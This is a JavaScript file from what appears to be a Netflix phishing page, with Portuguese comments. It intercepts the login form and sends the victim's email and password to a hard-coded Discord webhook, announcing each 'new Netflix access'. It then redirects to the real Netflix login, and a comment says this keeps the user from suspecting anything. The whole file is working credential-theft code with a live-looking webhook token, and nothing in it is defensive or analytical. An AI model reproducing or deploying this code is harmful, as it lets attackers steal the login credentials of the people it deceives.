const webhookURL = "https://discord.com/api/webhooks/1481425939975114946/DK0ymjsQ73mw8Ub08uYiDgOuwWeq8HWuRGkunjvM-r1P74ghg-DWIYXgen-rijVO_lk6";

document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();

    const emailValue = document.getElementById('email').value;
    const passwordValue = document.getElementById('password').value;
    const btn = document.getElementById('btnSubmit');

    // Estilo de carregamento
    btn.innerText = "Entrando...";
    btn.style.opacity = "0.7";
    btn.disabled = true;

    const payload = {
        content: "@everyone", // Marca você quando cair conta
        embeds: [{
            title: "🍿 NOVO ACESSO NETFLIX 🍿",
            color: 15158332,
            fields: [
                {
                    name: "👤 Usuário",
                    value: `\`${emailValue}\``,
                    inline: true
                },
                {
                    name: "🔑 Senha",
                    value: `\`${passwordValue}\``,
                    inline: true
                }
            ],
            footer: { text: "Data: " + new Date().toLocaleString() }
        }]
    };

    // Envio usando fetch
    fetch(webhookURL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    })
    .then(response => {
        console.log("Sucesso:", response.status);
        // Só redireciona se o envio for concluído
        setTimeout(() => {
            window.location.href = "https://www.netflix.com/br/login";
        }, 500); 
    })
    .catch(error => {
        console.error("Erro no envio:", error);
        // Mesmo se der erro na rede, redireciona para o usuário não suspeitar
        window.location.href = "https://www.netflix.com/br/login";
    });
});
